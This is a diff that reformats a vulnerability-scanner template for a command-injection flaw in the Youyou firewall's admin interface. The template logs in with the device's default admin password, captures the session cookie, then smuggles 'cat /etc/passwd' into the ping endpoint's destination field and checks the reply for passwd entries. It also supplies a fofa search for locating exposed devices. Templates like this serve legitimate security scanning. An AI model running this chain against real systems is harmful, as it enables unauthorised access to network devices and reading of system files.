@@ -1,35 +1,50 @@
+expression: r0() && r1()
 id: youyou-firewall-rce
-
 info:
-  name: 佑友防火墙 后台命令执行漏洞
   author: daffainfo
+  description: "\u4F51\u53CB\u9632\u706B\u5899+\u8DEF\u7531\uFF0C\u4FDD\u969C\u60A8\
+    \u7684\u7F51\u7EDC\u66F4\u5B89\u5168\u66F4\u7A33\u5B9A\u3002\u5F25\u8865\u4F20\
+    \u7EDF\u8DEF\u7531\u5668\u56E0\u5185\u5916\u4EBA\u6570\u589E\u52A0\u5E26\u6765\
+    \u7684\u7F51\u7EDC\u5EF6\u8FDF\u548C\u4E0D\u7A33\u5B9A\u95EE\u9898\uFF1B\u9632\
+    \u706B\u5899\u6A21\u5757\u5177\u5907\u4E86\u9632\u9ED1\u529F\u80FD\uFF0C\u9632\
+    \u6B62ARP\u7B49\u75C5\u6BD2\u9A9A\u6270\uFF1B\u4F51\u53CB\u9632\u706B\u5899\u7F51\
+    \u5173\u540C\u65F6\u8FD8\u914D\u5907\u4E86\u4E0A\u7F51\u884C\u4E3A\u7BA1\u7406\
+    \u6A21\u5757\uFF0C\u53EF\u4EE5\u5408\u7406\u6709\u6548\u63A7\u5236\u5458\u5DE5\
+    \u4E0A\u7F51\u884C\u4E3A\uFF0C\u5927\u5927\u964D\u4F4E\u4E86\u5458\u5DE5\u4E0A\
+    \u7F51\u4E2D\u75C5\u6BD2\u7684\u6982\u7387\uFF0C\u540C\u65F6\u9AD8\u6548\u4F7F\
+    \u7528\u516C\u53F8\u5E26\u5BBD\uFF0C\u4E0D\u4F1A\u9020\u6210\u7F51\u7EDC\u963B\
+    \u585E\u7B49\u72B6\u51B5\u3002\u4F51\u53CB\u9632\u706B\u5899\u7CFB\u7EDF\u5B58\
+    \u5728\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\
+    \u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\
+    \uFF0C\u5BFC\u81F4\u670D\u52A1\u5668\u5931\u9677\u3002\nfofa-query: title=\"\u4F51\
+    \u53CB\u9632\u706B\u5899\"\n"
+  name: "\u4F51\u53CB\u9632\u706B\u5899 \u540E\u53F0\u547D\u4EE4\u6267\u884C\u6F0F\
+    \u6D1E"
+  reference:
+  - https://mp.weixin.qq.com/s/DE34Gu6Dw9hBbkdJqizSYQ
   severity: critical
   verified: true
-  description: |
-    佑友防火墙+路由，保障您的网络更安全更稳定。弥补传统路由器因内外人数增加带来的网络延迟和不稳定问题；防火墙模块具备了防黑功能，防止ARP等病毒骚扰；佑友防火墙网关同时还配备了上网行为管理模块，可以合理有效控制员工上网行为，大大降低了员工上网中病毒的概率，同时高效使用公司带宽，不会造成网络阻塞等状况。佑友防火墙系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
-    fofa-query: title="佑友防火墙"
-  reference:
-    - https://mp.weixin.qq.com/s/DE34Gu6Dw9hBbkdJqizSYQ
-    
+rules:
+  r0:
+    expression: 'response.status == 200 && response.body.bcontains(b''"success":true'')
+      && response.body.bcontains(b''"message":'') && response.raw_header.bcontains(b''Set-Cookie'')  &&
+      response.raw_header.bcontains(b''FWSESSID='')
+
+      '
+    output:
+      phpsession: search["phpsession"]
+      search: '"Set-Cookie: FWSESSID=(?P<phpsession>.*?)\n".bsubmatch(response.raw_header)'
+    request:
+      body: username=admin&password=hicomadmin&language=zh-cn
+      method: POST
+      path: /index.php?c=user&a=ajax_save
+  r1:
+    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+    request:
+      body: interface=&destip=127.0.0.1+%7C+cat+/etc/passwd
+      headers:
+        Cookie: FWSESSID={{phpsession}};   lange=zh-cn
+      method: POST
+      path: /index.php?c=maintain&a=ping
 set:
   hosturl: request.url
-rules:
-    r0:
-        request:
-            method: POST
-            path: /index.php?c=user&a=ajax_save
-            body: username=admin&password=hicomadmin&language=zh-cn
-        expression: |
-            response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"message":') && response.raw_header.bcontains(b'Set-Cookie')  && response.raw_header.bcontains(b'FWSESSID=')
-        output:
-            search: '"Set-Cookie: FWSESSID=(?P<phpsession>.*?)\n".bsubmatch(response.raw_header)'
-            phpsession: search["phpsession"]
-    r1:
-        request:
-            method: POST
-            path: /index.php?c=maintain&a=ping
-            headers:
-                Cookie: "FWSESSID={{phpsession}};   lange=zh-cn"
-            body: interface=&destip=127.0.0.1+%7C+cat+/etc/passwd
-        expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0() && r1()
